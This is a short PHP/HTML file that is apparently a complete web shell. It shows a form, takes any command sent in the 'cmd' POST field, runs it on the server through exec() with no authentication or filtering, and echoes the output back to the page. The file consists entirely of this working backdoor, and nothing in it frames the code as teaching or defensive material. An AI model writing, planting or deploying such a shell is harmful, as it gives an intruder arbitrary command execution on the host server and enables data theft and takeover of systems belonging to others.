<!DOCTYPE html>
<html>
<head>
        <meta charset="UTF-8">
</head>
<body>

<?php
if(isset($_POST['cmd'])){
  $cmd=$_POST['cmd'];
  echo('cmd='.$cmd.'<br>');
  exec($cmd,$out);
  foreach ($out as $tmp) {
        echo($tmp.'<br>');
          }
  }
else {
  echo ('<form action="" method=POST><input type="text" name="cmd">
        <input type="submit" name="submit" value="Go"> </form>');
  }
?>

</body>
</html>
